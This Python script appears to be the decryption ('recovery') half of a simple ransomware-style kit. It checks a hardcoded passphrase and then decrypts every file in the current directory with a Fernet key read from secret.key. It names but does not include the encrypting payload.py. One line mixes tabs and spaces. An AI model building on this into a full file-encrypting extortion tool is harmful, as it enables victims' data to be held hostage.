#!/usr/bin/env python3
passphrase="nocoffeenoworkee!!!"
import os
from cryptography.fernet import Fernet

files=[]
for file in os.listdir():
	if file=="payload.py" or file=="recovery.py" or file=="secret.key":
		continue
	if os.path.isfile(file):
        	files.append(file)
if passphrase==input("\nEnter passphrase:\t"):
	with open("secret.key","rb") as seckey:
		key=seckey.read()
	for file in files:
		with open(file,"rb") as rfile:
			content=rfile.read()
		deccontent=Fernet(key).decrypt(content)
		with open(file,"wb") as wfile:
			wfile.write(deccontent)
	print("Decryption Sucessfull!!!\n have a nice day!!!\n")
else:
	print("\nWrong passphrase!!!")
